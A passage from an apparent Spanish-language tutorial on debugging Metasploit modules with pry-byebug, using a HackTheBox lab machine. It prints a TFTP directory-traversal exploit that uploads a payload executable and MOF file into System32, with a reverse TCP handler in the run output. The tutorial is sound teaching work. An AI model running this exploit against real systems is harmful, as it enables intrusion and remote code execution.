*<span class="w"> </span>Closing<span class="w"> </span>connection<span class="w"> </span><span class="m">0</span>
</code></pre></div>

<h4 id="metasploit-debugging">Metasploit Debugging<a class="headerlink" href="#metasploit-debugging" title="Permanent link">&para;</a></h4>
<p>Muchas han sido las veces que lanzando un exploit el cual aparentemente parece reunir todos los requisitos necesarios para una explotación exitosa desde Metasploit, no rula, peta o incluso no nos devuelve ningún tipo de <em>Verbose</em>. Para lidiar con esto, existe una pequeña utilidad externa la cual nos permite Debuggear el programa en tiempo de ejecución, permitiéndonos así saber qué valores están tomando todas las variables así como conocer si se están recogiendo bien los valores que fijamos desde las opciones de configuración.</p>
<p>Otra opción también recomendable y que trataremos en este punto consiste en configurar un Proxy desde Burpsuite, de manera que primero el Exploit pasa por el intermediario (útil para ver cómo viaja nuestra petición), y luego enruta al Host remoto.</p>
<p><strong>1. Pry-ByeBug</strong></p>
<p>Antes que nada, para evitar que nuestro Metasploit corrompa, creamos una instancia del recurso sobre el directorio <strong>/opt</strong>:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>cp<span class="w"> </span>-r<span class="w"> </span>/usr/share/metasploit-framework<span class="w"> </span>/opt/.
</code></pre></div>

<p>Una vez hecho, creamos el siguiente recurso en <strong>~/.pryrc</strong>:</p>
<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span>defined?<span class="o">(</span>PryByebug<span class="o">)</span>
<span class="w">  </span>Pry.commands.alias_command<span class="w"> </span><span class="s1">&#39;c&#39;</span>,<span class="w"> </span><span class="s1">&#39;continue&#39;</span>
<span class="w">  </span>Pry.commands.alias_command<span class="w"> </span><span class="s1">&#39;s&#39;</span>,<span class="w"> </span><span class="s1">&#39;step&#39;</span>
<span class="w">  </span>Pry.commands.alias_command<span class="w"> </span><span class="s1">&#39;n&#39;</span>,<span class="w"> </span><span class="s1">&#39;next&#39;</span>
<span class="w">  </span>Pry.commands.alias_command<span class="w"> </span><span class="s1">&#39;f&#39;</span>,<span class="w"> </span><span class="s1">&#39;finish&#39;</span>
end

Pry::Commands.command<span class="w"> </span>/^$/,<span class="w"> </span><span class="s2">&quot;repeat last command&quot;</span><span class="w"> </span><span class="k">do</span>
<span class="w">  </span>_pry_.run_command<span class="w"> </span>Pry.history.to_a.last
end
</code></pre></div>

<p>Nos resultará de utilidad para poder jugar con <strong>Alias</strong> en vez de escribir la instrucción entera. Aplicamos el siguiente comando para instalar <strong>pry-byebug</strong>:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>gem<span class="w"> </span><span class="s1">&#39;pry-byebug&#39;</span>
</code></pre></div>

<p>Una vez hecho, abrimos nuestro recurso <strong>/opt/metasploit-framework/msfconsole</strong> con nuestro editor preferido y añadimos como requerimiento el <strong>pry-byebug</strong> de la siguiente forma:</p>
<div class="codehilite"><pre><span></span><code><span class="c1">#</span>
<span class="c1"># Standard Library</span>
<span class="c1">#</span>

require<span class="w"> </span><span class="s1">&#39;pathname&#39;</span>
require<span class="w"> </span><span class="s1">&#39;pry-byebug&#39;</span><span class="w"> </span><span class="c1"># Nueva línea a insertar, las demás están por defecto.</span>

<span class="k">if</span><span class="w"> </span>ENV<span class="o">[</span><span class="s1">&#39;METASPLOIT_FRAMEWORK_PROFILE&#39;</span><span class="o">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;true&#39;</span>
</code></pre></div>

<p>Para poner un caso práctico, vamos a ponerlo en práctica con la máquina <strong>Dropzone</strong> de HackTheBox. Esta máquina se puede comprometer a través de un exploit de Metasploit, pero este no rula correctamente tal y como necesitamos para que todo funcione.</p>
<p>El servicio a atacar es el <strong>TFTP</strong>, y el módulo es el <strong>exploit/windows/tftp/distinct_tftp_traversal</strong>. Este exploit, cuenta con las siguientes configuraciones:</p>
<div class="codehilite"><pre><span></span><code>Module<span class="w"> </span>options<span class="w"> </span><span class="o">(</span>exploit/windows/tftp/distinct_tftp_traversal<span class="o">)</span>:

<span class="w">   </span>Name<span class="w">   </span>Current<span class="w"> </span>Setting<span class="w">  </span>Required<span class="w">  </span>Description
<span class="w">   </span>----<span class="w">   </span>---------------<span class="w">  </span>--------<span class="w">  </span>-----------
<span class="w">   </span>DEPTH<span class="w">  </span><span class="m">10</span><span class="w">               </span>no<span class="w">        </span>Levels<span class="w"> </span>to<span class="w"> </span>reach<span class="w"> </span>base<span class="w"> </span>directory
<span class="w">   </span>RHOST<span class="w">                   </span>yes<span class="w">       </span>The<span class="w"> </span>remote<span class="w"> </span>TFTP<span class="w"> </span>server<span class="w"> </span>address
<span class="w">   </span>RPORT<span class="w">  </span><span class="m">69</span><span class="w">               </span>yes<span class="w">       </span>The<span class="w"> </span>remote<span class="w"> </span>TFTP<span class="w"> </span>server<span class="w"> </span>port


Exploit<span class="w"> </span>target:

<span class="w">   </span>Id<span class="w">  </span>Name
<span class="w">   </span>--<span class="w">  </span>----
<span class="w">   </span><span class="m">0</span><span class="w">   </span>Distinct<span class="w"> </span>TFTP<span class="w"> </span><span class="m">3</span>.10<span class="w"> </span>on<span class="w"> </span>Windows
</code></pre></div>

<p>En este caso, podemos aplicar un <strong>LFI</strong> sobre el servicio, siendo la variable <strong>DEPTH</strong> la correspondiente al número de veces que queremos retroceder hasta llegar a la ruta raíz. Este exploit, cuenta con un ligero problema y es que para el caso aplicado, el valor de DEPTH debe valer 0, y por defecto tras setearlo mantiene su valor de 10, lo que hace que el exploit no funcione correctamente.</p>
<p>¿Cómo podríamos haber sabido esto sin mirar el código?, <strong>pry-byebug</strong> será la respuesta a nuestros problemas.</p>
<p>Lo que haremos será generar una instancia del módulo importando el mismo sobre el directorio ~/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>✗<span class="o">]</span>─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/s4vitar/Desktop<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#searchsploit -m exploits/windows/webapps/41714.rb</span>
<span class="w">  </span>Exploit:<span class="w"> </span>Distinct<span class="w"> </span>TFTP<span class="w"> </span><span class="m">3</span>.10<span class="w"> </span>-<span class="w"> </span>Writable<span class="w"> </span>Directory<span class="w"> </span>Traversal<span class="w"> </span>Execution<span class="w"> </span><span class="o">(</span>Metasploit<span class="o">)</span>
<span class="w">      </span>URL:<span class="w"> </span>https://www.exploit-db.com/exploits/41714/
<span class="w">     </span>Path:<span class="w"> </span>/usr/share/exploitdb/exploits/windows/webapps/41714.rb
File<span class="w"> </span>Type:<span class="w"> </span>Ruby<span class="w"> </span>script,<span class="w"> </span>ASCII<span class="w"> </span>text,<span class="w"> </span>with<span class="w"> </span>CRLF<span class="w"> </span>line<span class="w"> </span>terminators

Copied<span class="w"> </span>to:<span class="w"> </span>/home/s4vitar/Desktop/41714.rb


┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/s4vitar/Desktop<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#cp 41714.rb ~/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb</span>
</code></pre></div>

<p>Recordemos que jugamos con instancias para evitar que el binario original pete por alguna razón. Una vez hecho, dado que hemos importado la utilidad <strong>pry-byebug</strong> en la nueva instancia de <strong>msfconsole</strong>, lo que nos queda es establecer un <strong>BreakPoint</strong> sobre el módulo que queremos Debuggear. </p>
<p>Para ello, abrimos la instancia del módulo, y añadimos la siguiente línea (lo haré en la siguiente porción de código):</p>
<div class="codehilite"><pre><span></span><code><span class="w">  </span>def<span class="w"> </span>exploit
<span class="w">    </span><span class="nv">peer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;#{datastore[&#39;RHOST&#39;]}:#{datastore[&#39;RPORT&#39;]}&quot;</span>

<span class="w">    </span><span class="c1"># Setup the necessary files to do the wbemexec trick</span>
<span class="w">    </span>binding.pry<span class="w"> </span><span class="c1"># &lt;-------------------------------- Nueva línea que hemos añadido</span>
<span class="w">    </span><span class="nv">exe_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand_text_alpha<span class="o">(</span>rand<span class="o">(</span><span class="m">10</span><span class="o">)</span>+5<span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;.exe&#39;</span>
</code></pre></div>

<p>¿Qué consguimos con esto?, vamos a comprobarlo. Correremos el <strong>msfconsole</strong> desde la ruta <strong>/opt/metasploit-framework/msfconsole</strong>, posteriormente seleccionaremos el nuevo módulo clonado, setearemos el <strong>DEPTH</strong> a 0, configuramos el resto de variables y le daremos a <strong>run</strong>:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>✗<span class="o">]</span>─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/opt/metasploit-framework<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#/opt/metasploit-framework/msfconsole -q</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>persistent<span class="w"> </span>handler<span class="o">(</span>s<span class="o">)</span>...
msf<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>exploit/windows/tftp/exploit_tftp<span class="w"> </span>
msf<span class="w"> </span>exploit<span class="o">(</span>windows/tftp/exploit_tftp<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>show<span class="w"> </span>options

Module<span class="w"> </span>options<span class="w"> </span><span class="o">(</span>exploit/windows/tftp/exploit_tftp<span class="o">)</span>:

<span class="w">   </span>Name<span class="w">   </span>Current<span class="w"> </span>Setting<span class="w">  </span>Required<span class="w">  </span>Description
<span class="w">   </span>----<span class="w">   </span>---------------<span class="w">  </span>--------<span class="w">  </span>-----------
<span class="w">   </span>DEPTH<span class="w">  </span><span class="m">10</span><span class="w">               </span>no<span class="w">        </span>Levels<span class="w"> </span>to<span class="w"> </span>reach<span class="w"> </span>base<span class="w"> </span>directory
<span class="w">   </span>RHOST<span class="w">                   </span>yes<span class="w">       </span>The<span class="w"> </span>remote<span class="w"> </span>TFTP<span class="w"> </span>server<span class="w"> </span>address
<span class="w">   </span>RPORT<span class="w">  </span><span class="m">69</span><span class="w">               </span>yes<span class="w">       </span>The<span class="w"> </span>remote<span class="w"> </span>TFTP<span class="w"> </span>server<span class="w"> </span>port


Exploit<span class="w"> </span>target:

<span class="w">   </span>Id<span class="w">  </span>Name
<span class="w">   </span>--<span class="w">  </span>----
<span class="w">   </span><span class="m">0</span><span class="w">   </span>Distinct<span class="w"> </span>TFTP<span class="w"> </span><span class="m">3</span>.10<span class="w"> </span>on<span class="w"> </span>Windows


msf<span class="w"> </span>exploit<span class="o">(</span>windows/tftp/exploit_tftp<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>DEPTH<span class="w"> </span><span class="m">0</span>
<span class="nv">DEPTH</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="m">0</span>
msf<span class="w"> </span>exploit<span class="o">(</span>windows/tftp/exploit_tftp<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>RHOST<span class="w"> </span><span class="m">192</span>.168.1.12
<span class="nv">RHOST</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="m">192</span>.168.1.12
msf<span class="w"> </span>exploit<span class="o">(</span>windows/tftp/exploit_tftp<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>run
</code></pre></div>

<p>Una vez hecho, obtendremos los siguientes resultados:</p>
<div class="codehilite"><pre><span></span><code>msf<span class="w"> </span>exploit<span class="o">(</span>windows/tftp/exploit_tftp<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>run

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Started<span class="w"> </span>reverse<span class="w"> </span>TCP<span class="w"> </span>handler<span class="w"> </span>on<span class="w"> </span><span class="m">192</span>.168.1.51:4444<span class="w"> </span>
Found<span class="w"> </span>plugin<span class="w"> </span>pry-byebug,<span class="w"> </span>but<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>require<span class="w"> </span><span class="s1">&#39;pry-byebug&#39;</span>
cannot<span class="w"> </span>load<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>--<span class="w"> </span>pry-byebug

From:<span class="w"> </span>/root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb<span class="w"> </span>@<span class="w"> </span>line<span class="w"> </span><span class="m">86</span><span class="w"> </span>Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:

<span class="w">     </span><span class="m">81</span>:<span class="w"> </span>def<span class="w"> </span>exploit
<span class="w">     </span><span class="m">82</span>:<span class="w">   </span><span class="nv">peer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;#{datastore[&#39;RHOST&#39;]}:#{datastore[&#39;RPORT&#39;]}&quot;</span>
<span class="w">     </span><span class="m">83</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">84</span>:<span class="w">   </span><span class="c1"># Setup the necessary files to do the wbemexec trick</span>
<span class="w">     </span><span class="m">85</span>:<span class="w">   </span>binding.pry
<span class="w"> </span><span class="o">=</span>&gt;<span class="w">  </span><span class="m">86</span>:<span class="w">   </span><span class="nv">exe_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand_text_alpha<span class="o">(</span>rand<span class="o">(</span><span class="m">10</span><span class="o">)</span>+5<span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;.exe&#39;</span>
<span class="w">     </span><span class="m">87</span>:<span class="w">   </span><span class="nv">exe</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>generate_payload_exe
<span class="w">     </span><span class="m">88</span>:<span class="w">   </span><span class="nv">mof_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand_text_alpha<span class="o">(</span>rand<span class="o">(</span><span class="m">10</span><span class="o">)</span>+5<span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;.mof&#39;</span>
<span class="w">     </span><span class="m">89</span>:<span class="w">   </span><span class="nv">mof</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>generate_mof<span class="o">(</span>mof_name,<span class="w"> </span>exe_name<span class="o">)</span>
<span class="w">     </span><span class="m">90</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">91</span>:<span class="w">   </span><span class="c1"># Configure how deep we want to traverse</span>
<span class="w">     </span><span class="m">92</span>:<span class="w">   </span><span class="nv">depth</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>datastore<span class="o">[</span><span class="s1">&#39;DEPTH&#39;</span><span class="o">]</span>.nil?<span class="w"> </span>or<span class="w"> </span>datastore<span class="o">[</span><span class="s1">&#39;DEPTH&#39;</span><span class="o">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span>?<span class="w"> </span><span class="m">10</span><span class="w"> </span>:<span class="w"> </span>datastore<span class="o">[</span><span class="s1">&#39;DEPTH&#39;</span><span class="o">]</span>
<span class="w">     </span><span class="m">93</span>:<span class="w">   </span><span class="nv">levels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;../&quot;</span><span class="w"> </span>*<span class="w"> </span>depth
<span class="w">     </span><span class="m">94</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">95</span>:<span class="w">   </span><span class="c1"># Upload the malicious executable to C:\Windows\System32\</span>
<span class="w">     </span><span class="m">96</span>:<span class="w">   </span>print_status<span class="o">(</span><span class="s2">&quot;#{peer} - Uploading executable (#{exe.length.to_s} bytes)&quot;</span><span class="o">)</span>
<span class="w">     </span><span class="m">97</span>:<span class="w">   </span>upload<span class="o">(</span><span class="s2">&quot;#{levels}WINDOWS\\system32\\#{exe_name}&quot;</span>,<span class="w"> </span>exe<span class="o">)</span>
<span class="w">     </span><span class="m">98</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">99</span>:<span class="w">   </span><span class="c1"># Let the TFTP server idle a bit before sending another file</span>
<span class="w">    </span><span class="m">100</span>:<span class="w">   </span><span class="k">select</span><span class="o">(</span>nil,<span class="w"> </span>nil,<span class="w"> </span>nil,<span class="w"> </span><span class="m">1</span><span class="o">)</span>
<span class="w">    </span><span class="m">101</span>:<span class="w"> </span>
<span class="w">    </span><span class="m">102</span>:<span class="w">   </span><span class="c1"># Upload the mof file</span>
<span class="w">    </span><span class="m">103</span>:<span class="w">   </span>print_status<span class="o">(</span><span class="s2">&quot;#{peer} - Uploading .mof...&quot;</span><span class="o">)</span>
<span class="w">    </span><span class="m">104</span>:<span class="w">   </span>upload<span class="o">(</span><span class="s2">&quot;#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}&quot;</span>,<span class="w"> </span>mof<span class="o">)</span>
<span class="w">    </span><span class="m">105</span>:<span class="w"> </span>end

<span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w"> </span>pry<span class="o">(</span><span class="c1">#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt;</span>
</code></pre></div>

<p>En este preciso instante, nos situaríamos en la línea 86 del código del programa, manteniendo el mismo en estado de pausa (esto es así debido a que es en la línea superior donde hemos fijado el Breakpoint).</p>
<p>Llegados a este punto, si nos fijamos, en esa misma línea se va a almacenar un valor para la variable exe_name, ¿podríamos ver el valor que se almacena en dicha variable?, la respuesta es sí... para ello necesitamos avanzar una instrucción en la línea del programa para posteriormente ver su contenido. Lo haríamos de la siguiente forma:</p>
<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w"> </span>pry<span class="o">(</span><span class="c1">#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; n</span>

From:<span class="w"> </span>/root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb<span class="w"> </span>@<span class="w"> </span>line<span class="w"> </span><span class="m">87</span><span class="w"> </span>Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:

<span class="w">     </span><span class="m">81</span>:<span class="w"> </span>def<span class="w"> </span>exploit
<span class="w">     </span><span class="m">82</span>:<span class="w">   </span><span class="nv">peer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;#{datastore[&#39;RHOST&#39;]}:#{datastore[&#39;RPORT&#39;]}&quot;</span>
<span class="w">     </span><span class="m">83</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">84</span>:<span class="w">   </span><span class="c1"># Setup the necessary files to do the wbemexec trick</span>
<span class="w">     </span><span class="m">85</span>:<span class="w">   </span>binding.pry
<span class="w">     </span><span class="m">86</span>:<span class="w">   </span><span class="nv">exe_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand_text_alpha<span class="o">(</span>rand<span class="o">(</span><span class="m">10</span><span class="o">)</span>+5<span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;.exe&#39;</span>
<span class="w"> </span><span class="o">=</span>&gt;<span class="w">  </span><span class="m">87</span>:<span class="w">   </span><span class="nv">exe</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>generate_payload_exe
<span class="w">     </span><span class="m">88</span>:<span class="w">   </span><span class="nv">mof_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand_text_alpha<span class="o">(</span>rand<span class="o">(</span><span class="m">10</span><span class="o">)</span>+5<span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;.mof&#39;</span>
<span class="w">     </span><span class="m">89</span>:<span class="w">   </span><span class="nv">mof</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>generate_mof<span class="o">(</span>mof_name,<span class="w"> </span>exe_name<span class="o">)</span>
<span class="w">     </span><span class="m">90</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">91</span>:<span class="w">   </span><span class="c1"># Configure how deep we want to traverse</span>
<span class="w">     </span><span class="m">92</span>:<span class="w">   </span><span class="nv">depth</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>datastore<span class="o">[</span><span class="s1">&#39;DEPTH&#39;</span><span class="o">]</span>.nil?<span class="w"> </span>or<span class="w"> </span>datastore<span class="o">[</span><span class="s1">&#39;DEPTH&#39;</span><span class="o">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span>?<span class="w"> </span><span class="m">10</span><span class="w"> </span>:<span class="w"> </span>datastore<span class="o">[</span><span class="s1">&#39;DEPTH&#39;</span><span class="o">]</span>
<span class="w">     </span><span class="m">93</span>:<span class="w">   </span><span class="nv">levels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;../&quot;</span><span class="w"> </span>*<span class="w"> </span>depth
<span class="w">     </span><span class="m">94</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">95</span>:<span class="w">   </span><span class="c1"># Upload the malicious executable to C:\Windows\System32\</span>
<span class="w">     </span><span class="m">96</span>:<span class="w">   </span>print_status<span class="o">(</span><span class="s2">&quot;#{peer} - Uploading executable (#{exe.length.to_s} bytes)&quot;</span><span class="o">)</span>
<span class="w">     </span><span class="m">97</span>:<span class="w">   </span>upload<span class="o">(</span><span class="s2">&quot;#{levels}WINDOWS\\system32\\#{exe_name}&quot;</span>,<span class="w"> </span>exe<span class="o">)</span>
<span class="w">     </span><span class="m">98</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">99</span>:<span class="w">   </span><span class="c1"># Let the TFTP server idle a bit before sending another file</span>
<span class="w">    </span><span class="m">100</span>:<span class="w">   </span><span class="k">select</span><span class="o">(</span>nil,<span class="w"> </span>nil,<span class="w"> </span>nil,<span class="w"> </span><span class="m">1</span><span class="o">)</span>
<span class="w">    </span><span class="m">101</span>:<span class="w"> </span>
<span class="w">    </span><span class="m">102</span>:<span class="w">   </span><span class="c1"># Upload the mof file</span>
<span class="w">    </span><span class="m">103</span>:<span class="w">   </span>print_status<span class="o">(</span><span class="s2">&quot;#{peer} - Uploading .mof...&quot;</span><span class="o">)</span>
<span class="w">    </span><span class="m">104</span>:<span class="w">   </span>upload<span class="o">(</span><span class="s2">&quot;#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}&quot;</span>,<span class="w"> </span>mof<span class="o">)</span>
<span class="w">    </span><span class="m">105</span>:<span class="w"> </span>end

<span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w"> </span>pry<span class="o">(</span><span class="c1">#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; exe_name</span>
<span class="o">=</span>&gt;<span class="w"> </span><span class="s2">&quot;xMDsIBr.exe&quot;</span>
<span class="o">[</span><span class="m">2</span><span class="o">]</span><span class="w"> </span>pry<span class="o">(</span><span class="c1">#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt;</span>
</code></pre></div>

<p>Donde como vemos, el valor que está almacenando dicha variable es <strong>xMDsIBr.exe</strong>. De igual manera, podríamos ver como las variables <strong>depth</strong> y <strong>levels</strong> no toman el valor que deberían. Para ello, podremos establecer un Breakpoint en la línea 96, dado que en este punto ya ambas variables se encuentran declarados y con valor.</p>
<p>Aplicamos los siguientes comandos:</p>
<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="m">2</span><span class="o">]</span><span class="w"> </span>pry<span class="o">(</span><span class="c1">#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; break 96</span>

<span class="w">  </span>Breakpoint<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>/root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb<span class="w"> </span>@<span class="w"> </span><span class="m">96</span><span class="w"> </span><span class="o">(</span>Enabled<span class="o">)</span><span class="w"> </span>

<span class="w">      </span><span class="m">93</span>:<span class="w">     </span><span class="nv">levels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;../&quot;</span><span class="w"> </span>*<span class="w"> </span>depth
<span class="w">    </span><span class="m">94</span>:<span class="w"> </span>
<span class="w">    </span><span class="m">95</span>:<span class="w">     </span><span class="c1"># Upload the malicious executable to C:\Windows\System32\</span>
<span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="m">96</span>:<span class="w">     </span>print_status<span class="o">(</span><span class="s2">&quot;#{peer} - Uploading executable (#{exe.length.to_s} bytes)&quot;</span><span class="o">)</span>
<span class="w">    </span><span class="m">97</span>:<span class="w">     </span>upload<span class="o">(</span><span class="s2">&quot;#{levels}WINDOWS\\system32\\#{exe_name}&quot;</span>,<span class="w"> </span>exe<span class="o">)</span>
<span class="w">    </span><span class="m">98</span>:<span class="w"> </span>
<span class="w">    </span><span class="m">99</span>:<span class="w">     </span><span class="c1"># Let the TFTP server idle a bit before sending another file</span>


<span class="o">[</span><span class="m">3</span><span class="o">]</span><span class="w"> </span>pry<span class="o">(</span><span class="c1">#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; c</span>

<span class="w">  </span>Breakpoint<span class="w"> </span><span class="m">1</span>.<span class="w"> </span>First<span class="w"> </span>hit

From:<span class="w"> </span>/root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb<span class="w"> </span>@<span class="w"> </span>line<span class="w"> </span><span class="m">96</span><span class="w"> </span>Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:

<span class="w">     </span><span class="m">81</span>:<span class="w"> </span>def<span class="w"> </span>exploit
<span class="w">     </span><span class="m">82</span>:<span class="w">   </span><span class="nv">peer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;#{datastore[&#39;RHOST&#39;]}:#{datastore[&#39;RPORT&#39;]}&quot;</span>
<span class="w">     </span><span class="m">83</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">84</span>:<span class="w">   </span><span class="c1"># Setup the necessary files to do the wbemexec trick</span>
<span class="w">     </span><span class="m">85</span>:<span class="w">   </span>binding.pry
<span class="w">     </span><span class="m">86</span>:<span class="w">   </span><span class="nv">exe_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand_text_alpha<span class="o">(</span>rand<span class="o">(</span><span class="m">10</span><span class="o">)</span>+5<span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;.exe&#39;</span>
<span class="w">     </span><span class="m">87</span>:<span class="w">   </span><span class="nv">exe</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>generate_payload_exe
<span class="w">     </span><span class="m">88</span>:<span class="w">   </span><span class="nv">mof_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rand_text_alpha<span class="o">(</span>rand<span class="o">(</span><span class="m">10</span><span class="o">)</span>+5<span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;.mof&#39;</span>
<span class="w">     </span><span class="m">89</span>:<span class="w">   </span><span class="nv">mof</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>generate_mof<span class="o">(</span>mof_name,<span class="w"> </span>exe_name<span class="o">)</span>
<span class="w">     </span><span class="m">90</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">91</span>:<span class="w">   </span><span class="c1"># Configure how deep we want to traverse</span>
<span class="w">     </span><span class="m">92</span>:<span class="w">   </span><span class="nv">depth</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>datastore<span class="o">[</span><span class="s1">&#39;DEPTH&#39;</span><span class="o">]</span>.nil?<span class="w"> </span>or<span class="w"> </span>datastore<span class="o">[</span><span class="s1">&#39;DEPTH&#39;</span><span class="o">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span>?<span class="w"> </span><span class="m">10</span><span class="w"> </span>:<span class="w"> </span>datastore<span class="o">[</span><span class="s1">&#39;DEPTH&#39;</span><span class="o">]</span>
<span class="w">     </span><span class="m">93</span>:<span class="w">   </span><span class="nv">levels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;../&quot;</span><span class="w"> </span>*<span class="w"> </span>depth
<span class="w">     </span><span class="m">94</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">95</span>:<span class="w">   </span><span class="c1"># Upload the malicious executable to C:\Windows\System32\</span>
<span class="w"> </span><span class="o">=</span>&gt;<span class="w">  </span><span class="m">96</span>:<span class="w">   </span>print_status<span class="o">(</span><span class="s2">&quot;#{peer} - Uploading executable (#{exe.length.to_s} bytes)&quot;</span><span class="o">)</span>
<span class="w">     </span><span class="m">97</span>:<span class="w">   </span>upload<span class="o">(</span><span class="s2">&quot;#{levels}WINDOWS\\system32\\#{exe_name}&quot;</span>,<span class="w"> </span>exe<span class="o">)</span>
<span class="w">     </span><span class="m">98</span>:<span class="w"> </span>
<span class="w">     </span><span class="m">99</span>:<span class="w">   </span><span class="c1"># Let the TFTP server idle a bit before sending another file</span>
<span class="w">    </span><span class="m">100</span>:<span class="w">   </span><span class="k">select</span><span class="o">(</span>nil,<span class="w"> </span>nil,<span class="w"> </span>nil,<span class="w"> </span><span class="m">1</span><span class="o">)</span>
<span class="w">    </span><span class="m">101</span>:<span class="w"> </span>
<span class="w">    </span><span class="m">102</span>:<span class="w">   </span><span class="c1"># Upload the mof file</span>
